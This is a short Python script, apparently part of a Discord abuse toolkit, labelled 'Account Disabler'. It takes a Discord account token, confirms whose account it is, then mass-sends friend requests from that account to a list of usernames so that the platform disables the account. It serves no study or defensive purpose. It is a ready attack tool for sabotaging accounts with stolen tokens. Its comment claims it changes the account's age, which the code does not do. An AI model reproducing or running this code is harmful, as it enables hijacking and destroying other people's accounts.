import requests
from util.plugins.common import setTitle, clear

def TokenDisable():
    setTitle("Account Disabler")
    clear()

    # Change their age to below 13 years old, which is against the terms of service and disables their account
    print("Enter account token to disable")
    token = input("Token: ")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"\nUser Details: {res['username']}#{res['discriminator']} - ({res['id']})")
    input("If These Details Are Correct Press Enter! (This Will Start Disabling The Account, Use At Own Risk!)")
    print()

    with open('assets/users.txt', 'r') as file:
        for username in file.read().splitlines():
            try:
                usr = username.split('#')
                r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
                print(f"\t{usr[0]}#{usr[1]} Added!")
            except:
                print("Something Went Wrong!")
    
    print("\n\nAccount successfully disabled")
    input("Press enter to exit")
    TokenDisable()
